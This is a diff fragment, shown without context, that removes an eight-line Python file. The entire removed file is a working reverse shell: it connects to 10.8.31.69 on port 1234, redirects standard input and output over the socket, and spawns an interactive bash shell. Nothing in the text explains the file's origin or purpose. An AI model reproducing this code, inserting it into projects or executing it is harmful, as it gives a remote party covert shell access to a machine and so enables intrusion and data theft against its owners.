@@ -1,8 +1,0 @@
-import sys
-import socket
-import os
-import pty
-s=socket.socket()
-s.connect(("10.8.31.69", 1234))
-[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
-pty.spawn("/bin/bash")
